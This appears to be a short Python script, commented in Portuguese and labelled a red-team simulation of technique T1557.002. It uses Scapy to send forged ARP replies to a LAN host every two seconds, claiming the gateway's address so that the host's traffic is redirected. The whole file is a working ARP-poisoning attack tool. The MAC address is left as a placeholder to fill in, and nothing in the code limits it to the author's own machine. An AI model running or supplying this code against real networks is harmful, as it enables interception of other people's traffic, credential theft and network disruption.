import scapy.all as scapy
import time
import sys

# --- CONFIGURAÇÃO MANUAL (FORÇA BRUTA) ---
MEU_IP_ALVO = "192.168.15.5" 
GATEWAY_IP = "192.168.15.1"
# COLOQUE ABAIXO O "ENDEREÇO FÍSICO" QUE APARECEU NO IPCONFIG /ALL
MEU_MAC_REAL = "SEU-MAC-AQUI" 

def spoof_manual(target_ip, target_mac, spoof_ip):
    try:
        # Criamos o pacote sem precisar perguntar o MAC para a rede
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)
        return True
    except:
        return False

print(f"[*] Simulação Red Team (T1557.002) - MODO MANUAL")
print(f"[*] Alvo: {MEU_IP_ALVO} | Fingindo ser: {GATEWAY_IP}")

try:
    while True:
        if spoof_manual(MEU_IP_ALVO, MEU_MAC_REAL, GATEWAY_IP):
            print("[+] Pacote de envenenamento enviado!", end="\r")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[*] Simulação encerrada.")
    